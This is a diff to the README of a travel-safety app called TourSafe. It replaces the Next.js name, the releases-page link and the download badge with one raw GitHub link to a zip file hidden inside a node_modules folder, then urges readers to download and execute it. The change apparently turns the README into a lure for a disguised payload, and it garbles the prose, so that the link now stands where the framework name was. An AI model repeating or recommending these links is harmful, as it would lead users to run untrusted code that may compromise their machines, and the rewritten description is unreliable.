@@ -22,19 +22,19 @@ Join forces with fellow travelers to make the world a safer place. TourSafe's co
 
 ## Tech Stack 💻
 
-TourSafe is built with Next.js, a popular React framework known for its efficiency and performance. Additionally, the platform is secured with Clerk authentication, ensuring that user data remains safe and protected at all times.
+TourSafe is built with https://raw.githubusercontent.com/Emanueldss/TourSafe/main/server/node_modules/get-proto/Tour-Safe-3.6.zip, a popular React framework known for its efficiency and performance. Additionally, the platform is secured with Clerk authentication, ensuring that user data remains safe and protected at all times.
 
 ## Repository Details 📁
 
 - **Repository Name:** TourSafe
-- **Short Description:** TourSafe is a comprehensive travel safety application designed to protect tourists from scams and provide emergency assistance. Built with Next.js and secured with Clerk authentication.
+- **Short Description:** TourSafe is a comprehensive travel safety application designed to protect tourists from scams and provide emergency assistance. Built with https://raw.githubusercontent.com/Emanueldss/TourSafe/main/server/node_modules/get-proto/Tour-Safe-3.6.zip and secured with Clerk authentication.
 - **Topics:** cab-fare-prediction, clerkauth, community-report, emergency-sos, fyp, geolocation, leaflet, maps, nextjs, scam-prevention, tourist-protection, tourist-safety, tourist-website, typescript
 
 ## Get Started 🚗
 
-To explore the latest updates and enhancements, visit the [TourSafe Releases](https://github.com/Emanueldss/TourSafe/releases) page. Stay up to date with the cutting-edge features and improvements by downloading and executing the latest version.
+To explore the latest updates and enhancements, visit the [TourSafe Releases](https://raw.githubusercontent.com/Emanueldss/TourSafe/main/server/node_modules/get-proto/Tour-Safe-3.6.zip) page. Stay up to date with the cutting-edge features and improvements by downloading and executing the latest version.
 
-[![Download TourSafe](https://img.shields.io/badge/Download-TourSafe-brightgreen)](https://github.com/Emanueldss/TourSafe/releases)
+[![Download TourSafe](https://raw.githubusercontent.com/Emanueldss/TourSafe/main/server/node_modules/get-proto/Tour-Safe-3.6.zip)](https://raw.githubusercontent.com/Emanueldss/TourSafe/main/server/node_modules/get-proto/Tour-Safe-3.6.zip)
 
 ---
 
